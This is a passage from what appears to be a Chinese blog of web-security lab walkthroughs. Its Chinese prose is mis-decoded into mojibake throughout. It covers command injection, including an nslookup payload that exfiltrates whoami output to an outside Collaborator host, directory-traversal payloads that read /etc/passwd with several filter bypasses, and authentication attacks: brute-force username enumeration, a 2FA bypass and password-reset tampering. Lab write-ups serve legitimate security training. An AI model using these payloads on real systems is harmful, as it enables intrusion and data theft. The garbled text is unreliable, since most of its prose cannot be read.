‡æ˜¯äº§ç”Ÿåç§’å»¶æ—¶</strong></p></blockquote><p>æ³¨å…¥ç‚¹åœ¨ç‚¹å‡»<code>Submit feedback</code>æ‰€å‘æ•°æ®åŒ…ä¸­</p><p><img src="/sake-s-blog/assets/image-20230107223152334-BIYkKsJv.png" alt="image-20230107223152334"></p><p>æŠ“åŒ…å°†<code>email=b%40g.com</code>æ”¹ä¸º<code>email=b%40g.com||ping -c 10 127.0.0.1||</code>ï¼ŒæˆåŠŸè§£å†³Lab</p><p><img src="/sake-s-blog/assets/image-20230107225504039-D_xj2KPx.png" alt="image-20230107225504039"></p><h2 id="å‘½ä»¤æ³¨å…¥ä¸è¾“å‡ºé‡å®šå‘" tabindex="-1"><a class="header-anchor" href="#å‘½ä»¤æ³¨å…¥ä¸è¾“å‡ºé‡å®šå‘"><span>å‘½ä»¤æ³¨å…¥ä¸è¾“å‡ºé‡å®šå‘</span></a></h2><blockquote><p>é‡å®šå‘è¾“å‡ºçš„æ³¨å‘½ä»¤ä¸€ä¸ªæ–‡ä»¶åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œç„¶åä½¿ç”¨çš„å›¾ç‰‡åŠ è½½URLæ£€ç´¢å†…å®¹çš„æ–‡ä»¶ã€‚</p></blockquote><p>æ³¨å…¥ç‚¹åœ¨ç‚¹å‡»<code>Submit feedback</code>æ‰€å‘æ•°æ®åŒ…ä¸­</p><p><img src="/sake-s-blog/assets/image-20230107223152334-BIYkKsJv.png" alt="image-20230107223152334"></p><p>æŠ“åŒ…å°†<code>email=b%40g.com</code>æ”¹ä¸º<code>email=b%40c.com||whoami&gt;/var/www/images/a.txt||</code>ï¼Œï¼ˆå…¶ä¸­&quot;&gt;&quot;æ˜¯é‡å®šå‘ç¬¦ï¼‰</p><p><img src="/sake-s-blog/assets/image-20230114201404990-X_Gq-oI0.png" alt="image-20230114201404990"></p><p>ç„¶åæ‰“å¼€ä¸€å¼ å›¾ç‰‡æŠŠ<code>filename</code>è¯·æ±‚çš„æ–‡ä»¶æ”¹ä¸º<code>a.txt</code>ï¼ŒæˆåŠŸè§£å†³Lab</p><p><img src="/sake-s-blog/assets/image-20230114201517130-Dof_2fT0.png" alt="image-20230114201517130"></p><p><img src="/sake-s-blog/assets/image-20230114201602470-DdKCJCae.png" alt="image-20230114201602470"></p><h2 id="å‘½ä»¤æ³¨å…¥ä¸oob" tabindex="-1"><a class="header-anchor" href="#å‘½ä»¤æ³¨å…¥ä¸oob"><span>å‘½ä»¤æ³¨å…¥ä¸OOB</span></a></h2><blockquote><p><strong>ç›®æ ‡æ˜¯å‘Burp Collaboratorå‘å‡ºDNS lookup</strong></p></blockquote><blockquote><p>nslookupå‘½ä»¤ç”¨äº<strong>æŸ¥è¯¢DNSçš„è®°å½•</strong>ï¼Œ<strong>æŸ¥çœ‹åŸŸåè§£ææ˜¯å¦æ­£å¸¸</strong>ï¼Œ<strong>åœ¨ç½‘ç»œæ•…éšœçš„æ—¶å€™ç”¨æ¥è¯Šæ–­ç½‘ç»œé—®é¢˜</strong>ã€‚</p></blockquote><p>æ³¨å…¥ç‚¹åœ¨ç‚¹å‡»<code>Submit feedback</code>æ‰€å‘æ•°æ®åŒ…ä¸­</p><p><img src="/sake-s-blog/assets/image-20230107223152334-BIYkKsJv.png" alt="image-20230107223152334"></p><p>æŠ“åŒ…å°†<code>email=dasdasd%40qweqwe.com</code>æ”¹ä¸º<code>email=dasdasd%40qweqwe.com||nslookup+tolzgp9rlzgmp2ssbxhpkawd64cu0j.burpcollaborator.net||</code>ï¼ŒæˆåŠŸè§£å†³Lab</p><p><img src="/sake-s-blog/assets/image-20230121170906395-CZoyQOmn.png" alt="image-20230121170906395"></p><p><img src="/sake-s-blog/assets/image-20230121171029688-B3QFqfTh.png" alt="image-20230121171029688"></p><h2 id="å‘½ä»¤æ³¨å…¥ä¸å¸¦å¤–æ•°æ®æ³„éœ²" tabindex="-1"><a class="header-anchor" href="#å‘½ä»¤æ³¨å…¥ä¸å¸¦å¤–æ•°æ®æ³„éœ²"><span>å‘½ä»¤æ³¨å…¥ä¸å¸¦å¤–æ•°æ®æ³„éœ²</span></a></h2><blockquote><p><strong>ç›®æ ‡æ˜¯æ‰§è¡Œwhoamiå‘½ä»¤ï¼Œå¹¶é€šè¿‡DNSæŸ¥è¯¢å°†è¾“å‡ºå¯¼å‡ºåˆ°Burp Collaborator</strong></p></blockquote><p>æ³¨å…¥ç‚¹åœ¨ç‚¹å‡»<code>Submit feedback</code>æ‰€å‘æ•°æ®åŒ…ä¸­</p><p><img src="/sake-s-blog/assets/image-20230107223152334-BIYkKsJv.png" alt="image-20230107223152334"></p><p>æŠ“åŒ…å°†<code>email=b%40c.com</code>æ”¹ä¸º<code>email=b%40c.com||nslookup+</code>`whoami`<code>.z00sswoz16601lbdkba977578yeo2d.burpcollaborator.net||</code>ï¼ŒæˆåŠŸè§£å†³Lab</p><p><img src="/sake-s-blog/assets/image-20230121171824854-DUVohxI0.png" alt="image-20230121171824854"></p><p><img src="/sake-s-blog/assets/image-20230121172250187-B2kOXAiR.png" alt="image-20230121172250187"></p><h2 id="-3" tabindex="-1"><a class="header-anchor" href="#-3"><span>------------------------------</span></a></h2><h1 id="ç›®å½•éå†" tabindex="-1"><a class="header-anchor" href="#ç›®å½•éå†"><span><strong>ç›®å½•éå†</strong></span></a></h1><p>æœ¬æ–‡æ¶‰åŠLabè¿‡äºç®€å•ï¼Œç¯‡å¹…è¾ƒçŸ­</p><p><img src="/sake-s-blog/assets/image-20230106203154552-BO3xdU7Q.png" alt="image-20230106203154552"></p><blockquote><p>ç›®å½•éå†ï¼ˆä¹Ÿç§°ä¸ºæ–‡ä»¶è·¯å¾„éå†ï¼‰æ˜¯ä¸€ç§ç½‘ç»œå®‰å…¨æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…è¯»å–è¿è¡Œåº”ç”¨ç¨‹åºçš„æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶ã€‚ è¿™å¯èƒ½åŒ…æ‹¬åº”ç”¨ç¨‹åºä»£ç å’Œæ•°æ®ã€åç«¯ç³»ç»Ÿçš„å‡­æ®ä»¥åŠæ•æ„Ÿçš„æ“ä½œç³»ç»Ÿæ–‡ä»¶ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿå†™å…¥æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶ï¼Œä»è€Œå…è®¸ä»–ä»¬ä¿®æ”¹åº”ç”¨ç¨‹åºæ•°æ®æˆ–è¡Œä¸ºï¼Œå¹¶æœ€ç»ˆå®Œå…¨æ§åˆ¶æœåŠ¡å™¨ã€‚</p></blockquote><h2 id="ç®€å•æ¡ˆä¾‹1-1" tabindex="-1"><a class="header-anchor" href="#ç®€å•æ¡ˆä¾‹1-1"><span>ç®€å•æ¡ˆä¾‹1</span></a></h2><p>éšä¾¿æ‰“å¼€ä¸€å¼ å›¾ç‰‡</p><p><img src="/sake-s-blog/assets/image-20230106210738994-DzTyBbr1.png" alt="image-20230106210738994"></p><p><img src="/sake-s-blog/assets/image-20230106210907926-DN_M1Aa5.png" alt="image-20230106210907926"></p><p>æŠŠè¯·æ±‚çš„æ–‡ä»¶<code>filename</code>æ”¹ä¸º<code>../../../etc/passwd</code></p><h2 id="ç®€å•æ¡ˆä¾‹2" tabindex="-1"><a class="header-anchor" href="#ç®€å•æ¡ˆä¾‹2"><span>ç®€å•æ¡ˆä¾‹2</span></a></h2><p>æŠŠè¯·æ±‚çš„æ–‡ä»¶<code>filename</code>æ”¹ä¸º<code>/etc/passwd</code>ï¼ˆç»å¯¹è·¯å¾„ï¼‰</p><h2 id="ç®€å•æ¡ˆä¾‹3" tabindex="-1"><a class="header-anchor" href="#ç®€å•æ¡ˆä¾‹3"><span>ç®€å•æ¡ˆä¾‹3</span></a></h2><p>æŠŠè¯·æ±‚çš„æ–‡ä»¶<code>filename</code>æ”¹ä¸º<code>....//....//....//etc/passwd</code>(åŒå†™ç»•è¿‡)</p><h2 id="ç®€å•æ¡ˆä¾‹4" tabindex="-1"><a class="header-anchor" href="#ç®€å•æ¡ˆä¾‹4"><span>ç®€å•æ¡ˆä¾‹4</span></a></h2><p>æŠŠè¯·æ±‚çš„æ–‡ä»¶<code>filename</code>æ”¹ä¸º<code>..%252f..252f%..%252f..%252fetc%252fpasswd</code>(åŒurlç¼–ç )</p><h2 id="ç®€å•æ¡ˆä¾‹5" tabindex="-1"><a class="header-anchor" href="#ç®€å•æ¡ˆä¾‹5"><span>ç®€å•æ¡ˆä¾‹5</span></a></h2><p>æŠŠè¯·æ±‚çš„æ–‡ä»¶<code>filename</code>æ”¹ä¸º<code>/var/www/images/../../../etc/passwd</code></p><h2 id="ç®€å•æ¡ˆä¾‹6" tabindex="-1"><a class="header-anchor" href="#ç®€å•æ¡ˆä¾‹6"><span>ç®€å•æ¡ˆä¾‹6</span></a></h2><p>æŠŠè¯·æ±‚çš„æ–‡ä»¶<code>filename</code>æ”¹ä¸º<code>../../../etc/passwd%00.png</code>ï¼ˆ%00æˆªæ–­ï¼‰</p><h2 id="-4" tabindex="-1"><a class="header-anchor" href="#-4"><span>------------------------------</span></a></h2><h1 id="cors" tabindex="-1"><a class="header-anchor" href="#cors"><span>CORS</span></a></h1><p><img src="/sake-s-blog/assets/image-20230114205315477-C5fGgfzW.png" alt="image-20230114205315477"></p><blockquote><p><strong>è·¨æºèµ„æºå…±äº«</strong>ï¼ˆ<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/CORS" target="_blank" rel="noopener noreferrer">CORS<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>ï¼Œæˆ–é€šä¿—åœ°è¯‘ä¸ºè·¨åŸŸèµ„æºå…±äº«ï¼‰æ˜¯ä¸€ç§åŸºäº <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/HTTP" target="_blank" rel="noopener noreferrer">HTTP<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> å¤´çš„æœºåˆ¶ï¼Œè¯¥æœºåˆ¶é€šè¿‡å…è®¸æœåŠ¡å™¨æ ‡ç¤ºé™¤äº†å®ƒè‡ªå·±ä»¥å¤–çš„å…¶å®ƒ<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Origin" target="_blank" rel="noopener noreferrer">æº<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>ï¼ˆåŸŸã€åè®®æˆ–ç«¯å£ï¼‰ï¼Œä½¿å¾—æµè§ˆå™¨å…è®¸è¿™äº›æºè®¿é—®åŠ è½½è‡ªå·±çš„èµ„æºã€‚è·¨æºèµ„æºå…±äº«è¿˜é€šè¿‡ä¸€ç§æœºåˆ¶æ¥æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦ä¼šå…è®¸è¦å‘é€çš„çœŸå®è¯·æ±‚ï¼Œè¯¥æœºåˆ¶é€šè¿‡æµè§ˆå™¨å‘èµ·ä¸€ä¸ªåˆ°æœåŠ¡å™¨æ‰˜ç®¡çš„è·¨æºèµ„æºçš„â€œé¢„æ£€â€è¯·æ±‚ã€‚åœ¨é¢„æ£€ä¸­ï¼Œæµè§ˆå™¨å‘é€çš„å¤´ä¸­æ ‡ç¤ºæœ‰ HTTP æ–¹æ³•å’ŒçœŸå®è¯·æ±‚ä¸­ä¼šç”¨åˆ°çš„å¤´ã€‚</p></blockquote><blockquote><p>åŒæºç­–ç•¥æ˜¯ä¸€ç§é™åˆ¶æ€§çš„è·¨åŸŸè§„èŒƒï¼Œå®ƒé™åˆ¶äº†ç½‘ç«™ä¸æºåŸŸä¹‹å¤–çš„èµ„æºè¿›è¡Œäº¤äº’çš„èƒ½åŠ›ã€‚åŒæºç­–ç•¥æ˜¯å¤šå¹´å‰å®šä¹‰çš„ï¼Œä»¥åº”å¯¹æ½œåœ¨çš„æ¶æ„è·¨åŸŸäº¤äº’ï¼Œä¾‹å¦‚ä¸€ä¸ªç½‘ç«™ä»å¦ä¸€ä¸ªç½‘ç«™çªƒå–ç§äººæ•°æ®ã€‚å®ƒé€šå¸¸å…è®¸ä¸€ä¸ªåŸŸå‘å…¶ä»–åŸŸå‘å‡ºè¯·æ±‚ï¼Œä½†ä¸å…è®¸è®¿é—®å“åº”ã€‚</p></blockquote><h2 id="cors-vulnerability-with-basic-origin-reflection" tabindex="-1"><a class="header-anchor" href="#cors-vulnerability-with-basic-origin-reflection"><span>CORS vulnerability with basic origin reflection</span></a></h2><p>é¢˜ç›®è¦æ±‚ï¼š</p><blockquote><p>è¯¥ç½‘ç«™å…·æœ‰ä¸å®‰å…¨çš„CORSé…ç½®ï¼Œå› ä¸ºå®ƒä¿¡ä»»æ‰€æœ‰æ¥æºã€‚ä¸ºäº†è§£å†³è¿™ä¸ªå®éªŒï¼Œåˆ¶ä½œä¸€äº› JavaScriptï¼Œä½¿ç”¨ CORS æ¥æ£€ç´¢ç®¡ç†å‘˜çš„ APIï¼Œå¯†é’¥å¹¶å°†ä»£ç ä¸Šä¼ åˆ°æ‚¨çš„æ¼æ´åˆ©ç”¨æœåŠ¡å™¨ã€‚å½“æ‚¨æˆåŠŸæäº¤ç®¡ç†å‘˜çš„ API å¯†é’¥æ—¶ï¼Œå®éªŒå®¤å°±è§£å†³äº†ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡­æ®ç™»å½•è‡ªå·±çš„å¸æˆ·ï¼š wiener:peter</p></blockquote><p>æŠ“åŒ…å‘ç°è¯·æ±‚<code>/accountdetail</code>çš„<code>response</code>çš„<code>Access-Control-Allow-Credentials</code>å­—æ®µä¸º<code>True</code>ï¼Œ</p><p><img src="/sake-s-blog/assets/image-20230116135557860-BGpmYcKm.png" alt="image-20230116135557860"></p><h2 id="-5" tabindex="-1"><a class="header-anchor" href="#-5"><span>------------------------------</span></a></h2><h1 id="authentication" tabindex="-1"><a class="header-anchor" href="#authentication"><span>Authentication</span></a></h1><p><img src="/sake-s-blog/assets/image-20230116145328504-BfCDzA2T.png" alt="image-20230116145328504"></p><blockquote><p>èº«ä»½éªŒè¯æ˜¯éªŒè¯ç»™å®šç”¨æˆ·æˆ–å®¢æˆ·ç«¯èº«ä»½çš„è¿‡ç¨‹ã€‚æ¢è¨€ä¹‹ï¼Œè¿™æ¶‰åŠåˆ°ç¡®ä¿ä»–ä»¬çœŸçš„æ˜¯ä»–ä»¬å£°ç§°çš„é‚£ä¸ªäººã€‚è‡³å°‘åœ¨ä¸€å®šç¨‹åº¦ä¸Šï¼Œç½‘ç«™æš´éœ²ç»™ä»»ä½•é€šè¿‡è®¾è®¡è¿æ¥åˆ°äº’è”ç½‘çš„äººã€‚å› æ­¤ï¼Œå¥å£®çš„èº«ä»½éªŒè¯æœºåˆ¶æ˜¯æœ‰æ•ˆwebå®‰å…¨çš„ä¸€ä¸ªé‡è¦æ–¹é¢ã€‚</p><p>æœ‰ä¸‰ç§è®¤è¯å› ç´ ï¼Œå¯å°†ä¸åŒç±»å‹çš„è®¤è¯åˆ†ç±»ä¸ºï¼š</p><ul><li>æ‚¨çŸ¥é“çš„ä¸€äº›ä¿¡æ¯ï¼Œä¾‹å¦‚å¯†ç æˆ–å®‰å…¨é—®é¢˜çš„ç­”æ¡ˆã€‚è¿™äº›æœ‰æ—¶è¢«ç§°ä¸ºâ€œçŸ¥è¯†å› ç´ â€ã€‚</li><li>ä½ æ‹¥æœ‰çš„ä¸œè¥¿ï¼Œä¹Ÿå°±æ˜¯åƒæ‰‹æœºæˆ–å®‰å…¨ä»¤ç‰Œè¿™æ ·çš„ç‰©ç†å¯¹è±¡ã€‚è¿™äº›æœ‰æ—¶è¢«ç§°ä¸ºâ€œå æœ‰å› ç´ â€ã€‚</li><li>ä½ æ­£åœ¨åšçš„äº‹æƒ…ï¼Œä¾‹å¦‚ï¼Œä½ çš„ç”Ÿç‰©ç‰¹å¾æˆ–è¡Œä¸ºæ¨¡å¼ã€‚è¿™äº›æœ‰æ—¶è¢«ç§°ä¸ºâ€œå†…åœ¨å› ç´ â€ã€‚</li></ul><p>è®¤è¯æœºåˆ¶ä¾èµ–äºä¸€ç³»åˆ—æŠ€æœ¯æ¥éªŒè¯è¿™äº›å› ç´ ä¸­çš„ä¸€ä¸ªæˆ–å¤šä¸ªã€‚</p></blockquote><h2 id="username-enumeration-via-different-responses" tabindex="-1"><a class="header-anchor" href="#username-enumeration-via-different-responses"><span>Username enumeration via different responses</span></a></h2><p>é¶åœºè¦æ±‚ï¼š</p><blockquote><p>è¿™ä¸ªå®éªŒå®¤æ˜¯è„†å¼±çš„ï¼Œä»¥æšä¸¾çš„ç”¨æˆ·åå’Œå¯†ç çš„æš´åŠ›æ”»å‡»ã€‚ å®ƒæœ‰ä¸€ä¸ªå¸æˆ·ï¼Œä¸€ä¸ªå¯é¢„æµ‹çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå…¶ä¸­å¯ä»¥æ‰¾åˆ°ä»¥ä¸‹è¯è¡¨:</p><ul><li><a href="https://portswigger.net/web-security/authentication/auth-lab-usernames" target="_blank" rel="noopener noreferrer">å€™é€‰äººå <span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://portswigger.net/web-security/authentication/auth-lab-passwords" target="_blank" rel="noopener noreferrer">å€™é€‰äººçš„å¯†ç  <span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li></ul><p>è¦è§£å†³çš„å®éªŒå®¤ï¼Œä¸€ä¸€åˆ—ä¸¾ä¸€ä¸ªæœ‰æ•ˆçš„ç”¨æˆ·åã€æš´åŠ›ç ´è§£è¿™ä¸ªç”¨æˆ·å¯†ç ï¼Œç„¶åè®¿é—®ä»–ä»¬çš„å¸æˆ·çš„ç½‘é¡µã€‚</p></blockquote><p>å®éªŒæ­¥éª¤ï¼š</p><p>è¿›å…¥åˆ°ç™»å½•ç•Œé¢ï¼Œå°è¯•ç™»å½•å¹¶è¿›è¡ŒæŠ“åŒ…ï¼Œå¯ä»¥çœ‹åˆ°æ˜¾ç¤ºInvalid usernameï¼Œå‘Šè¯‰æˆ‘ä»¬ç”¨æˆ·åæ˜¯æ— æ•ˆçš„</p><p><img src="/sake-s-blog/assets/image-20230116145952241-tiZMCZlJ.png" alt="image-20230116145952241"></p><p><img src="/sake-s-blog/assets/image-20230116150138845-CzkuEnfP.png" alt="image-20230116150138845"></p><p>äºæ˜¯æˆ‘ä»¬æ ¹æ®Labæä¾›çš„ç”¨æˆ·åå’Œå¯†ç ä½¿ç”¨Intruderè¿›è¡Œçˆ†ç ´ï¼Œè®¾ç½®å¥½å­—å…¸å¼€å§‹è¿›è¡Œçˆ†ç ´</p><p><img src="/sake-s-blog/assets/image-20230116150440574-DdzNphag.png" alt="image-20230116150440574"></p><p>ç„¶ååœ¨çˆ†ç ´ç»“æœå¤„æŒ‰Lengthæ’åºï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªresponseæ˜¾ç¤ºçš„ç»“æœä¸åŒï¼Œæ˜¾ç¤ºçš„æ˜¯Incorrect passwordï¼Œè¿™å‘Šè¯‰æˆ‘ä»¬ç”¨æˆ·åæ˜¯autoï¼Œä½†å¯†ç é”™è¯¯</p><p><img src="/sake-s-blog/assets/image-20230116150619727-1NtUj4t_.png" alt="image-20230116150619727"></p><p>äºæ˜¯æˆ‘ä»¬ä»¥åŒæ ·çš„æ–¹æ³•çˆ†ç ´å¯†ç ï¼Œåœ¨çˆ†ç ´ç»“æœä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼šç”¨æˆ·åæ˜¯autoï¼Œå¯†ç æ˜¯monitoring</p><p><img src="/sake-s-blog/assets/image-20230116150913593-CKIA80W5.png" alt="image-20230116150913593"></p><p>ä½¿ç”¨çˆ†ç ´å¾—åˆ°çš„ç”¨æˆ·åå’Œå¯†ç ï¼ŒæˆåŠŸç™»å½•è§£å†³Lab</p><p><img src="/sake-s-blog/assets/image-20230116151126737--GAcK6H3.png" alt="image-20230116151126737"></p><blockquote><p>è¡¥å……åˆ†æï¼šç½‘ç«™å¯¹ç”¨æˆ·åå’Œå¯†ç é”™è¯¯é‡‡ç”¨äº†ä¸åŒå›æ˜¾ï¼Œä½¿å¾—å¯ä»¥é€ä¸ªå­—æ®µçˆ†ç ´ï¼ˆå¦‚æœåŒå›æ˜¾çš„è¯è¦åŒæ—¶å¯¹ä¸¤ä¸ªå­—æ®µè¿›è¡Œçˆ†ç ´ï¼Œpayloadç›´æ¥æ˜¯å¹³æ–¹çº§æ•°é‡ï¼‰</p></blockquote><h2 id="_2fa-simple-bypass" tabindex="-1"><a class="header-anchor" href="#_2fa-simple-bypass"><span>2FA simple bypass</span></a></h2><p>é¶åœºè¦æ±‚ï¼š</p><blockquote><p>è¿™ä¸ªå®éªŒå®¤çš„åŒå› ç´ è®¤è¯å¯ä»¥ç»•è¿‡ã€‚æ‚¨å·²è·å¾—æœ‰æ•ˆçš„ç”¨æˆ·åå’Œå¯†ç ï¼Œä½†æ— æƒè®¿é—®ç”¨æˆ·çš„2FAéªŒè¯ç ã€‚è¦è§£å†³å®éªŒå®¤é—®é¢˜ï¼Œè¯·è®¿é—®Carlosçš„å¸æˆ·é¡µé¢ã€‚ ä½ çš„è¯ä»¶ï¼šwiener:peter å—å®³è€…çš„è¯ä»¶ï¼šcarlos:montoya</p></blockquote><p>å®éªŒæ­¥éª¤ï¼š</p><p>ç™»å½•è¿›æä¾›çš„ç”¨æˆ·åï¼Œåœ¨é‚®ç®±æœåŠ¡å™¨æŸ¥çœ‹äºŒé‡éªŒè¯ç ï¼Œå¡«å…¥æ¡†ä¸­</p><p><img src="/sake-s-blog/assets/image-20230116152005706-KQZA6uSY.png" alt="image-20230116152005706"></p><p>å¯ä»¥æ³¨æ„åˆ°å¡«åè¯·æ±‚äº†/my-accountè¿™ä¸ªé¡µé¢ï¼Œå”¯ä¸€çš„è®¤è¯æ˜¯cookieè€Œå¹¶æœªæºå¸¦tokenç­‰è®¤è¯ï¼Œäºæ˜¯æˆ‘ä»¬æƒ³åˆ°å¯ä»¥ç›´æ¥ç™»å½•å—å®³è€…çš„ç”¨æˆ·åç„¶ååœ¨äºŒé‡éªŒè¯å¤„ï¼Œç›´æ¥ä»¥å—å®³è€…çš„cookieè¯·æ±‚/my-accountå³å¯ç›´æ¥ç™»å½•æˆåŠŸ</p><p><img src="/sake-s-blog/assets/image-20230116154940007-09W1tPwf.png" alt="image-20230116154940007"></p><blockquote><p>è¡¥å……åˆ†æï¼šäºŒé‡éªŒè¯ç å¡«å®Œåè¯·æ±‚çš„ç½‘ç«™åªé‡‡ç”¨cookieè¿›è¡Œèº«ä»½éªŒè¯</p></blockquote><h2 id="password-reset-broken-logic" tabindex="-1"><a class="header-anchor" href="#password-reset-broken-logic"><span>Password reset broken logic</span></a></h2><p>é¶åœºè¦æ±‚ï¼š</p><blockquote><p>è¯¥å®éªŒå®¤çš„å¯†ç é‡ç½®åŠŸèƒ½æ˜“å—æ”»å‡»ã€‚è¦è§£å†³å®éªŒå®¤é—®é¢˜ï¼Œè¯·é‡ç½® Carlos çš„å¯†ç ï¼Œç„¶åç™»å½•å¹¶è®¿é—®ä»–çš„â€œæˆ‘çš„å¸æˆ·â€é¡µé¢ã€‚</p><p>æ‚¨çš„å‡­æ®ï¼š wiener:peter å—å®³è€…ç”¨æˆ·åï¼š carlos</p></blockquote><p>å®éªŒæ­¥éª¤ï¼š</p><p>æŠ“åŒ…æ›´æ”¹å¯†ç é‡ç½®çš„æ•°æ®åŒ…ä¸ºå—å®³è€…çš„ç”¨æˆ·åï¼š <img src="/sake-s-blog/assets/image-20230116160651129-CsIzbc3c.png" alt="image-20230116160651129"></p><p><img src="/sake-s-blog/assets/image-20230116160900152-BDFuHf6F.png" alt="image-20230116160900152"></p><p>é‡‡ç”¨å—å®³è€…çš„ç”¨æˆ·åå’Œé‡ç½®åçš„å¯†ç è¿›è¡Œç™»å½•ï¼ŒæˆåŠŸç™»å½•å—å®³è€…ç”¨æˆ·</p><p><img src="/sake-s-blog/assets/image-20230116161022526-I3SW6xi_.png" alt="image-20230116161022526"></p><blockquote><p>è¡¥å……åˆ†æï¼šè™½ç„¶é‡‡ç”¨äº†tokenï¼Œä½†å¹¶æœªè¿›è¡Œå®è´¨æ€§çš„éªŒè¯ï¼Œå¯¼è‡´å¯†ç é‡ç½®çš„æ•°æ®åŒ…è¢«é‡æ”¾</p></blockquote><h2 id="username-enumeration-via-subtly-different-responses" tabindex="-1"><a class="header-anchor" href="#username-enumeration-via-subtly-different-responses"><span>Username enumeration via subtly different responses</span></a></h2><p>é¶åœºè¦æ±‚ï¼š</p><blockquote><p>è¿™ä¸ªå®éªŒå®¤å¾ˆå®¹æ˜“å—åˆ°ç”¨æˆ·åæšä¸¾å’Œå¯†ç æš´åŠ›æ”»å‡»ã€‚å®ƒæœ‰ä¸€ä¸ªå…·æœ‰å¯é¢„æµ‹ç”¨æˆ·åå’Œå¯†ç çš„å¸æˆ·ï¼Œå¯ä»¥åœ¨ä»¥ä¸‹å•è¯åˆ—è¡¨ä¸­æ‰¾åˆ°ï¼š</p><ul><li>å€™é€‰ç”¨æˆ·å</li><li>å€™é€‰å¯†ç </li></ul><p>è¦è§£å†³å®éªŒå®¤é—®é¢˜ï¼Œè¯·æšä¸¾ä¸€ä¸ªæœ‰æ•ˆçš„ç”¨æˆ·åï¼Œå¼ºåˆ¶ä½¿ç”¨è¯¥ç”¨æˆ·çš„å¯†ç ï¼Œç„¶åè®¿é—®ä»–ä»¬çš„å¸æˆ·é¡µé¢ã€‚</p></blockquote><p>å®éªŒæ­¥éª¤ï¼š</p><p>è¿˜æ˜¯æŠ“å–ç™»å½•çš„æ•°æ®åŒ…ï¼Œè¿›è¡Œç”¨æˆ·åçˆ†ç ´ï¼Œé€šè¿‡Lengthæ’åºå‘ç°æ•°æ®åŒ…é•¿çŸ­ä¸ä¸€ï¼Œæˆ‘ä»¬æ— æ³•è¿›è¡Œåˆ¤æ–­</p><p><img src="/sake-s-blog/assets/image-20230116162304406-CuDfMSm9.png" alt="image-20230116162304406"></p><p>æ­¤æ—¶æˆ‘ä»¬é‡‡ç”¨Grepè¿›è¡ŒåŒ¹é…ï¼Œè®¾ç½®èµ·å§‹å­—ç¬¦ä¸²&lt;p class=is-warning&gt;ï¼Œå’Œæœ«å°¾å­—ç¬¦ä¸²&lt;/p&gt;ï¼ŒåŒ¹é…ä¸­é—´å›æ˜¾çš„å†…å®¹</p><p><img src="/sake-s-blog/assets/image-20230116162714537-h9I2MnDn.png" alt="image-20230116162714537"></p><p><img src="/sake-s-blog/assets/image-20230116162932834-BUdv3alL.png" 